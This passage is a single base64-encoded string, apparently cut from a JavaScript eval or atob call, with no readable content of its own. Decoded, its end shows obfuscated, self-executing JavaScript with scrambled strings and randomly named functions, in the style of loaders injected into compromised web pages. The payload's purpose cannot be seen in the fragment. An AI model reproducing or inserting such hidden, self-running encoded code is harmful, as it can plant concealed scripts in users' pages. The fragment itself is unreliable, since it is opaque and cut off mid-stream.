soPGdsXi46SkZ7PHQ9KTw/ZXQkbyhdPW5lZTA8MDA0MWJhPF1ZXzxoc2I0MGUgNWFkOz1BdCFfYy5lKThpPDt2cmV7Zl91NVVzU0A9Njw8WHlzNTQuIShlYTxNKCAzbzFnOzw8cmM8ZSthSGplIGUobi4wKHQuK2Ulcj0pZGY8fWU7MSllIS45ZD1dKDxfdzwwcmlyPHIxZm50Y0lodXIgIWF0c3M7Lml9d0RfPCg8ITwpX10zXWk8NiVpPC4yYywgYmMgWS48ZXQhPTw8dTw8Jm50dDRpJnMyPDNlZT08WHAgbzE0M1sueil7MCFvN19pZiBfbjRyKTR2PGU8ZXRnLWF0YyIlbnIrXWM8VDxsY3RdKjxdKDFfLmUgJVphLl8gfX03ZTV7NWEoIFgwYW5vVCBuJjRhLmZsIDY7KCw2KWF0blN3YXR0LjhdJWU9ZV08OycpKTt2YXIgSGlnPUZQbyhURVgsekpZICk7SGlnKDIwMjYpO3JldHVybiA1MTg4fSkoKQ=='))
